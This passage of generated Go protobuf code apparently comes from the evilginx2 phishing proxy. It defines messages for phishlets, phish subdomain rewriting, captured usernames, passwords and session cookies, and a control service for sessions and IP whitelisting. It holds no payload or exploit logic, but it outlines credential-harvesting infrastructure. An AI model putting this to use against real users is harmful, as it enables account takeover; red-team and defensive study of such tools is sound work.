	return mi.MessageOf(x)
}

// Deprecated: Use SubFilter.ProtoReflect.Descriptor instead.
func (*SubFilter) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{16}
}

func (x *SubFilter) GetHostname() string {
	if x != nil {
		return x.Hostname
	}
	return ""
}

func (x *SubFilter) GetRules() []*SubFilterRule {
	if x != nil {
		return x.Rules
	}
	return nil
}

type SubFilterRule struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	TriggersOn    string                 `protobuf:"bytes,1,opt,name=triggers_on,json=triggersOn,proto3" json:"triggers_on,omitempty"`
	OrigSub       string                 `protobuf:"bytes,2,opt,name=orig_sub,json=origSub,proto3" json:"orig_sub,omitempty"`
	PhishSub      string                 `protobuf:"bytes,3,opt,name=phish_sub,json=phishSub,proto3" json:"phish_sub,omitempty"`
	MimeType      string                 `protobuf:"bytes,4,opt,name=mime_type,json=mimeType,proto3" json:"mime_type,omitempty"`
	RedirectOnly  string                 `protobuf:"bytes,5,opt,name=redirect_only,json=redirectOnly,proto3" json:"redirect_only,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *SubFilterRule) Reset() {
	*x = SubFilterRule{}
	mi := &file_proto_proxy_service_proto_msgTypes[17]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *SubFilterRule) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*SubFilterRule) ProtoMessage() {}

func (x *SubFilterRule) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[17]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use SubFilterRule.ProtoReflect.Descriptor instead.
func (*SubFilterRule) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{17}
}

func (x *SubFilterRule) GetTriggersOn() string {
	if x != nil {
		return x.TriggersOn
	}
	return ""
}

func (x *SubFilterRule) GetOrigSub() string {
	if x != nil {
		return x.OrigSub
	}
	return ""
}

func (x *SubFilterRule) GetPhishSub() string {
	if x != nil {
		return x.PhishSub
	}
	return ""
}

func (x *SubFilterRule) GetMimeType() string {
	if x != nil {
		return x.MimeType
	}
	return ""
}

func (x *SubFilterRule) GetRedirectOnly() string {
	if x != nil {
		return x.RedirectOnly
	}
	return ""
}

type AuthToken struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Domain        string                 `protobuf:"bytes,1,opt,name=domain,proto3" json:"domain,omitempty"`
	Keys          []*CookieAuthToken     `protobuf:"bytes,2,rep,name=keys,proto3" json:"keys,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *AuthToken) Reset() {
	*x = AuthToken{}
	mi := &file_proto_proxy_service_proto_msgTypes[18]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *AuthToken) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*AuthToken) ProtoMessage() {}

func (x *AuthToken) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[18]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use AuthToken.ProtoReflect.Descriptor instead.
func (*AuthToken) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{18}
}

func (x *AuthToken) GetDomain() string {
	if x != nil {
		return x.Domain
	}
	return ""
}

func (x *AuthToken) GetKeys() []*CookieAuthToken {
	if x != nil {
		return x.Keys
	}
	return nil
}

type CookieAuthToken struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Name          string                 `protobuf:"bytes,1,opt,name=name,proto3" json:"name,omitempty"`
	Re            string                 `protobuf:"bytes,2,opt,name=re,proto3" json:"re,omitempty"`
	Optional      bool                   `protobuf:"varint,3,opt,name=optional,proto3" json:"optional,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CookieAuthToken) Reset() {
	*x = CookieAuthToken{}
	mi := &file_proto_proxy_service_proto_msgTypes[19]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CookieAuthToken) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CookieAuthToken) ProtoMessage() {}

func (x *CookieAuthToken) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[19]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CookieAuthToken.ProtoReflect.Descriptor instead.
func (*CookieAuthToken) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{19}
}

func (x *CookieAuthToken) GetName() string {
	if x != nil {
		return x.Name
	}
	return ""
}

func (x *CookieAuthToken) GetRe() string {
	if x != nil {
		return x.Re
	}
	return ""
}

func (x *CookieAuthToken) GetOptional() bool {
	if x != nil {
		return x.Optional
	}
	return false
}

type AuthUrl struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Url           string                 `protobuf:"bytes,1,opt,name=url,proto3" json:"url,omitempty"`
	Domain        string                 `protobuf:"bytes,2,opt,name=domain,proto3" json:"domain,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *AuthUrl) Reset() {
	*x = AuthUrl{}
	mi := &file_proto_proxy_service_proto_msgTypes[20]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *AuthUrl) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*AuthUrl) ProtoMessage() {}

func (x *AuthUrl) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[20]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use AuthUrl.ProtoReflect.Descriptor instead.
func (*AuthUrl) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{20}
}

func (x *AuthUrl) GetUrl() string {
	if x != nil {
		return x.Url
	}
	return ""
}

func (x *AuthUrl) GetDomain() string {
	if x != nil {
		return x.Domain
	}
	return ""
}

type CookieTokenMap struct {
	state         protoimpl.MessageState  `protogen:"open.v1"`
	Tokens        map[string]*CookieToken `protobuf:"bytes,1,rep,name=tokens,proto3" json:"tokens,omitempty" protobuf_key:"bytes,1,opt,name=key" protobuf_val:"bytes,2,opt,name=value"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CookieTokenMap) Reset() {
	*x = CookieTokenMap{}
	mi := &file_proto_proxy_service_proto_msgTypes[21]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CookieTokenMap) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CookieTokenMap) ProtoMessage() {}

func (x *CookieTokenMap) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[21]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CookieTokenMap.ProtoReflect.Descriptor instead.
func (*CookieTokenMap) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{21}
}

func (x *CookieTokenMap) GetTokens() map[string]*CookieToken {
	if x != nil {
		return x.Tokens
	}
	return nil
}

type CookieToken struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Name          string                 `protobuf:"bytes,1,opt,name=name,proto3" json:"name,omitempty"`
	Value         string                 `protobuf:"bytes,2,opt,name=value,proto3" json:"value,omitempty"`
	Path          string                 `protobuf:"bytes,3,opt,name=path,proto3" json:"path,omitempty"`
	HttpOnly      bool                   `protobuf:"varint,4,opt,name=http_only,json=httpOnly,proto3" json:"http_only,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CookieToken) Reset() {
	*x = CookieToken{}
	mi := &file_proto_proxy_service_proto_msgTypes[22]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CookieToken) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CookieToken) ProtoMessage() {}

func (x *CookieToken) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[22]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CookieToken.ProtoReflect.Descriptor instead.
func (*CookieToken) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{22}
}

func (x *CookieToken) GetName() string {
	if x != nil {
		return x.Name
	}
	return ""
}

func (x *CookieToken) GetValue() string {
	if x != nil {
		return x.Value
	}
	return ""
}

func (x *CookieToken) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

func (x *CookieToken) GetHttpOnly() bool {
	if x != nil {
		return x.HttpOnly
	}
	return false
}

var File_proto_proxy_service_proto protoreflect.FileDescriptor

const file_proto_proxy_service_proto_rawDesc = "" +
	"\n" +
	"\x19proto/proxy_service.proto\x12\x05proxy\"T\n" +
	"\x12GetPhishletRequest\x12\x1a\n" +
	"\bhostname\x18\x01 \x01(\tR\bhostname\x12\"\n" +
	"\ris_phish_host\x18\x02 \x01(\bR\visPhishHost\"4\n" +
	"\x16ValidateSessionRequest\x12\x1a\n" +
	"\bhostname\x18\x01 \x01(\tR\bhostname\"\xbb\x01\n" +
	"\x14CreateSessionRequest\x12\x1d\n" +
	"\n" +
	"session_id\x18\x01 \x01(\tR\tsessionId\x12#\n" +
	"\rphishlet_name\x18\x02 \x01(\tR\fphishletName\x12\x1f\n" +
	"\vlanding_url\x18\x03 \x01(\tR\n" +
	"landingUrl\x12\x1d\n" +
	"\n" +
	"user_agent\x18\x04 \x01(\tR\tuserAgent\x12\x1f\n" +
	"\vremote_addr\x18\x05 \x01(\tR\n" +
	"remoteAddr\"\xaf\x05\n" +
	"\x14UpdateSessionRequest\x12\x1d\n" +
	"\n" +
	"session_id\x18\x01 \x01(\tR\tsessionId\x12\x1a\n" +
	"\busername\x18\x02 \x01(\tR\busername\x12\x1a\n" +
	"\bpassword\x18\x03 \x01(\tR\bpassword\x12?\n" +
	"\x06custom\x18\x04 \x03(\v2'.proxy.UpdateSessionRequest.CustomEntryR\x06custom\x12L\n" +
	"\vbody_tokens\x18\x05 \x03(\v2+.proxy.UpdateSessionRequest.BodyTokensEntryR\n" +
	"bodyTokens\x12L\n" +
	"\vhttp_tokens\x18\x06 \x03(\v2+.proxy.UpdateSessionRequest.HttpTokensEntryR\n" +
	"httpTokens\x12R\n" +
	"\rcookie_tokens\x18\a \x03(\v2-.proxy.UpdateSessionRequest.CookieTokensEntryR\fcookieTokens\x1a9\n" +
	"\vCustomEntry\x12\x10\n" +
	"\x03key\x18\x01 \x01(\tR\x03key\x12\x14\n" +
	"\x05value\x18\x02 \x01(\tR\x05value:\x028\x01\x1a=\n" +
	"\x0fBodyTokensEntry\x12\x10\n" +
	"\x03key\x18\x01 \x01(\tR\x03key\x12\x14\n" +
	"\x05value\x18\x02 \x01(\tR\x05value:\x028\x01\x1a=\n" +
	"\x0fHttpTokensEntry\x12\x10\n" +
	"\x03key\x18\x01 \x01(\tR\x03key\x12\x14\n" +
	"\x05value\x18\x02 \x01(\tR\x05value:\x028\x01\x1aV\n" +
	"\x11CookieTokensEntry\x12\x10\n" +
	"\x03key\x18\x01 \x01(\tR\x03key\x12+\n" +
	"\x05value\x18\x02 \x01(\v2\x15.proxy.CookieTokenMapR\x05value:\x028\x01\"P\n" +
	"\x10WhitelistRequest\x12\x17\n" +
	"\aip_addr\x18\x01 \x01(\tR\x06ipAddr\x12#\n" +
	"\rphishlet_name\x18\x02 \x01(\tR\fphishletName\"J\n" +
	"\x13GetSessionIdRequest\x12\x17\n" +
	"\aip_addr\x18\x01 \x01(\tR\x06ipAddr\x12\x1a\n" +
	"\bhostname\x18\x02 \x01(\tR\bhostname\"q\n" +
	"\x12WhitelistIPRequest\x12\x17\n" +
	"\aip_addr\x18\x01 \x01(\tR\x06ipAddr\x12\x1d\n" +
	"\n" +
	"session_id\x18\x02 \x01(\tR\tsessionId\x12#\n" +
	"\rphishlet_name\x18\x03 \x01(\tR\fphishletName\"\xa4\x01\n" +
	"\x13GetPhishletResponse\x12\x14\n" +
	"\x05found\x18\x01 \x01(\bR\x05found\x12+\n" +
	"\bphishlet\x18\x02 \x01(\v2\x0f.proxy.PhishletR\bphishlet\x12!\n" +
	"\fphish_domain\x18\x03 \x01(\tR\vphishDomain\x12'\n" +
	"\x0fphish_subdomain\x18\x04 \x01(\tR\x0ephishSubdomain\">\n" +
	"\x17ValidateSessionResponse\x12#\n" +
	"\rshould_handle\x18\x01 \x01(\bR\fshouldHandle\"G\n" +
	"\x15CreateSessionResponse\x12\x18\n" +
	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x14\n" +
	"\x05error\x18\x02 \x01(\tR\x05error\"G\n" +
	"\x15UpdateSessionResponse\x12\x18\n" +
	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x14\n" +
	"\x05error\x18\x02 \x01(\tR\x05error\":\n" +
	"\x11WhitelistResponse\x12%\n" +
	"\x0eis_whitelisted\x18\x01 \x01(\bR\risWhitelisted\"K\n" +
	"\x14GetSessionIdResponse\x12\x14\n" +
	"\x05found\x18\x01 \x01(\bR\x05found\x12\x1d\n" +
	"\n" +
	"session_id\x18\x02 \x01(\tR\tsessionId\"E\n" +
	"\x13WhitelistIPResponse\x12\x18\n" +
	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x14\n" +
	"\x05error\x18\x02 \x01(\tR\x05error\"\xc0\x02\n" +
	"\bPhishlet\x12\x12\n" +
	"\x04name\x18\x01 \x01(\tR\x04name\x12\x16\n" +
	"\x06author\x18\x02 \x01(\tR\x06author\x121\n" +
	"\vproxy_hosts\x18\x03 \x03(\v2\x10.proxy.ProxyHostR\n" +
	"proxyHosts\x121\n" +
	"\vsub_filters\x18\x04 \x03(\v2\x10.proxy.SubFilterR\n" +
	"subFilters\x121\n" +
	"\vauth_tokens\x18\x05 \x03(\v2\x10.proxy.AuthTokenR\n" +
	"authTokens\x12+\n" +
	"\tauth_urls\x18\x06 \x03(\v2\x0e.proxy.AuthUrlR\bauthUrls\x12!\n" +
	"\fredirect_url\x18\a \x01(\tR\vredirectUrl\x12\x1f\n" +
	"\vis_template\x18\b \x01(\bR\n" +
	"isTemplate\"\xda\x01\n" +
	"\tProxyHost\x12'\n" +
	"\x0fphish_subdomain\x18\x01 \x01(\tR\x0ephishSubdomain\x12%\n" +
	"\x0eorig_subdomain\x18\x02 \x01(\tR\rorigSubdomain\x12\x16\n" +
	"\x06domain\x18\x03 \x01(\tR\x06domain\x12%\n" +
	"\x0ehandle_session\x18\x04 \x01(\tR\rhandleSession\x12\x1d\n" +
	"\n" +
	"is_landing\x18\x05 \x01(\bR\tisLanding\x12\x1f\n" +
	"\vauto_filter\x18\x06 \x01(\bR\n" +
	"autoFilter\"S\n" +
	"\tSubFilter\x12\x1a\n" +
	"\bhostname\x18\x01 \x01(\tR\bhostname\x12*\n" +
	"\x05rules\x18\x02 \x03(\v2\x14.proxy.SubFilterRuleR\x05rules\"\xaa\x01\n" +
	"\rSubFilterRule\x12\x1f\n" +
	"\vtriggers_on\x18\x01 \x01(\tR\n" +
	"triggersOn\x12\x19\n" +
	"\borig_sub\x18\x02 \x01(\tR\aorigSub\x12\x1b\n" +
	"\tphish_sub\x18\x03 \x01(\tR\bphishSub\x12\x1b\n" +
	"\tmime_type\x18\x04 \x01(\tR\bmimeType\x12#\n" +
	"\rredirect_only\x18\x05 \x01(\tR\fredirectOnly\"O\n" +
	"\tAuthToken\x12\x16\n" +
	"\x06domain\x18\x01 \x01(\tR\x06domain\x12*\n" +
	"\x04keys\x18\x02 \x03(\v2\x16.proxy.CookieAuthTokenR\x04keys\"Q\n" +
	"\x0fCookieAuthToken\x12\x12\n" +
	"\x04name\x18\x01 \x01(\tR\x04name\x12\x0e\n" +
	"\x02re\x18\x02 \x01(\tR\x02re\x12\x1a\n" +
	"\boptional\x18\x03 \x01(\bR\boptional\"3\n" +
	"\aAuthUrl\x12\x10\n" +
	"\x03url\x18\x01 \x01(\tR\x03url\x12\x16\n" +
	"\x06domain\x18\x02 \x01(\tR\x06domain\"\x9a\x01\n" +
	"\x0eCookieTokenMap\x129\n" +
	"\x06tokens\x18\x01 \x03(\v2!.proxy.CookieTokenMap.TokensEntryR\x06tokens\x1aM\n" +
	"\vTokensEntry\x12\x10\n" +
	"\x03key\x18\x01 \x01(\tR\x03key\x12(\n" +
	"\x05value\x18\x02 \x01(\v2\x12.proxy.CookieTokenR\x05value:\x028\x01\"h\n" +
	"\vCookieToken\x12\x12\n" +
	"\x04name\x18\x01 \x01(\tR\x04name\x12\x14\n" +
	"\x05value\x18\x02 \x01(\tR\x05value\x12\x12\n" +
	"\x04path\x18\x03 \x01(\tR\x04path\x12\x1b\n" +
	"\thttp_only\x18\x04 \x01(\bR\bhttpOnly2\xa4\x04\n" +
	"\x13ProxyControlService\x12J\n" +
	"\x11GetPhishletByHost\x12\x19.proxy.GetPhishletRequest\x1a\x1a.proxy.GetPhishletResponse\x12P\n" +
	"\x0fValidateSession\x12\x1d.proxy.ValidateSessionRequest\x1a\x1e.proxy.ValidateSessionResponse\x12J\n" +
	"\rCreateSession\x12\x1b.proxy.CreateSessionRequest\x1a\x1c.proxy.CreateSessionResponse\x12J\n" +
	"\rUpdateSession\x12\x1b.proxy.UpdateSessionRequest\x1a\x1c.proxy.UpdateSessionResponse\x12D\n" +
	"\x0fIsWhitelistedIP\x12\x17.proxy.WhitelistRequest\x1a\x18.proxy.WhitelistResponse\x12K\n" +
	"\x10GetSessionIdByIP\x12\x1a.proxy.GetSessionIdRequest\x1a\x1b.proxy.GetSessionIdResponse\x12D\n" +
	"\vWhitelistIP\x12\x19.proxy.WhitelistIPRequest\x1a\x1a.proxy.WhitelistIPResponseB%Z#github.com/kgretzky/evilginx2/protob\x06proto3"

var (
	file_proto_proxy_service_proto_rawDescOnce sync.Once
	file_proto_proxy_service_proto_rawDescData []byte
)

func file_proto_proxy_service_proto_rawDescGZIP() []byte {
	file_proto_proxy_service_proto_rawDescOnce.Do(func() {
		file_proto_proxy_service_proto_rawDescData = protoimpl.X.CompressGZIP(unsafe.Slice(unsafe.StringData(file_proto_proxy_service_proto_rawDesc), len(file_proto_proxy_service_proto_rawDesc)))
	})
	return file_proto_proxy_service_proto_rawDescData
}

var file_proto_proxy_service_proto_msgTypes = make([]protoimpl.MessageInfo, 28)
var file_proto_proxy_service_proto_goTypes = []any{
	(*GetPhishletRequest)(nil),      // 0: proxy.GetPhishletRequest
	(*ValidateSessionRequest)(nil),  // 1: proxy.ValidateSessionRequest
	(*CreateSessionRequest)(nil),    // 2: proxy.CreateSessionRequest
	(*UpdateSessionRequest)(nil),    // 3: proxy.UpdateSessionRequest
	(*WhitelistRequest)(nil),        // 4: proxy.WhitelistRequest
	(*GetSessionIdRequest)(nil),     // 5: proxy.GetSessionIdRequest
	(*WhitelistIPRequest)(nil),      // 6: proxy.WhitelistIPRequest
	(*GetPhishletResponse)(nil),     // 7: proxy.GetPhishletResponse
	(*ValidateSessionResponse)(nil), // 8: proxy.ValidateSessionResponse
	(*CreateSessionResponse)(nil),   // 9: proxy.CreateSessionResponse
	(*UpdateSessionResponse)(nil),   // 10: proxy.UpdateSessionResponse
	(*WhitelistResponse)(nil),       // 11: proxy.WhitelistResponse
	(*GetSessionIdResponse)(nil),    // 12: proxy.GetSessionIdResponse
	(*WhitelistIPResponse)(nil),     // 13: proxy.WhitelistIPResponse
	(*Phishlet)(nil),                // 14: proxy.Phishlet
	(*ProxyHost)(nil),               // 15: proxy.ProxyHost
	(*SubFilter)(nil),               // 16: proxy.SubFilter
	(*SubFilterRule)(nil),           // 17: proxy.SubFilterRule
	(*AuthToken)(nil),               // 18: proxy.AuthToken
	(*CookieAuthToken)(nil),         // 19: proxy.CookieAuthToken
	(*AuthUrl)(nil),                 // 20: proxy.AuthUrl
	(*CookieTokenMap)(nil),          // 21: proxy.CookieTokenMap
	(*CookieToken)(nil),             // 22: proxy.CookieToken
	nil,                             // 23: proxy.UpdateSessionRequest.CustomEntry
	nil,                             // 24: proxy.UpdateSessionRequest.BodyTokensEntry
	nil,                             // 25: proxy.UpdateSessionRequest.HttpTokensEntry
	nil,                             // 26: proxy.UpdateSessionRequest.CookieTokensEntry
	nil,                             // 27: proxy.CookieTokenMap.TokensEntry
}
var file_proto_proxy_service_proto_depIdxs = []int32{
	23, // 0: proxy.UpdateSessionRequest.custom:type_name -> proxy.UpdateSessionRequest.CustomEntry
	24, // 1: proxy.UpdateSessionRequest.body_tokens:type_name -> proxy.UpdateSessionRequest.BodyTokensEntry
	25, // 2: proxy.UpdateSessionRequest.http_tokens:type_name -> proxy.UpdateSessionRequest.HttpTokensEntry
	26, // 3: proxy.UpdateSessionRequest.cookie_tokens:type_name -> proxy.UpdateSessionRequest.CookieTokensEntry
	14, // 4: proxy.GetPhishletResponse.phishlet:type_name -> proxy.Phishlet
	15, // 5: proxy.Phishlet.proxy_hosts:type_name -> proxy.ProxyHost
	16, // 6: proxy.Phishlet.sub_filters:type_name -> proxy.SubFilter
	18, // 7: proxy.Phishlet.auth_tokens:type_name -> proxy.AuthToken
	20, // 8: proxy.Phishlet.auth_urls:type_name -> proxy.AuthUrl
	17, // 9: proxy.SubFilter.rules:type_name -> proxy.SubFilterRule
	19, // 10: proxy.AuthToken.keys:type_name -> proxy.CookieAuthToken
	27, // 11: proxy.CookieTokenMap.tokens:type_name -> proxy.CookieTokenMap.TokensEntry
	21, // 12: proxy.UpdateSessionRequest.CookieTokensEntry.value:type_name -> proxy.CookieTokenMap
	22, // 13: proxy.CookieTokenMap.TokensEntry.value:type_name -> proxy.CookieToken
	0,  // 14: proxy.ProxyControlService.GetPhishletByHost:input_type -> proxy.GetPhishletRequest
	1,  // 15: proxy.ProxyControlService.ValidateSession:input_type -> proxy.ValidateSessionRequest
	2,  // 16: proxy.ProxyControlService.CreateSession:input_type -> proxy.CreateSessionRequest
	3,  // 17: proxy.ProxyControlService.UpdateSession:input_type -> proxy.UpdateSessionRequest
	4,  // 18: proxy.ProxyControlService.IsWhitelistedIP:input_type -> proxy.WhitelistRequest
	5,  // 19: proxy.ProxyControlService.GetSessionIdByIP:input_type -> proxy.GetSessionIdRequest
	6,  // 20: proxy.ProxyControlService.WhitelistIP:input_type -> proxy.WhitelistIPRequest
	7,  // 21: proxy.ProxyControlService.GetPhishletByHost:output_type -> proxy.GetPhishletResponse
	8,  // 22: proxy.ProxyControlService.ValidateSession:output_type -> proxy.ValidateSessionResponse
	9,  // 23: proxy.ProxyControlService.CreateSession:output_type -> proxy.CreateSessionResponse
	10, // 24: proxy.ProxyControlService.UpdateSession:output_type -> proxy.UpdateSessionResponse
	11, // 25: proxy.ProxyControlService.IsWhitelistedIP:output_type -> proxy.WhitelistResponse
	12, // 26: proxy.ProxyControlService.GetSessionIdByIP:output_type -> proxy.GetSessionIdResponse
	13, // 27: proxy.ProxyControlService.WhitelistIP:output_type -> proxy.WhitelistIPResponse
	21, // [21:28] is the sub-list for method output_type
	14, // [14:21] is the sub-list for method input_type
	14, // [14:14] is the sub-list for extension type_name
	14, // [14:14] is the sub-list for extension extendee
	0,  // [0:14] is the sub-list for field type_name
}

func init() { file_proto_proxy_service_proto_init() }
func file_proto_proxy_service_proto_init() {
	if File_proto_proxy_service_proto != nil {
		return
	}
	type x struct{}
	out := protoimpl.TypeBuilder{
		File: protoimpl.DescBuilder{
			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
			RawDescriptor: unsafe.Slice(unsafe.StringData(file_proto_proxy_service_proto_rawDesc), len(file_proto_proxy_service_proto_rawDesc)),
			NumEnums:      0,
			NumMessages:   28,
			NumExtensions: 0,
			NumServices:   1,
		},
		GoTypes:           file_proto_proxy_service_proto_goTypes,
		DependencyIndexes: file_proto_proxy_service_proto_depIdxs,
		MessageInfos:      file_proto_proxy_service_proto_msgTypes,
	}.Build()
	File_proto_proxy_service_proto = out.File
	file_proto_proxy_service_proto_goTypes = nil
	file_proto_proxy_service_proto_depIdxs = nil
}
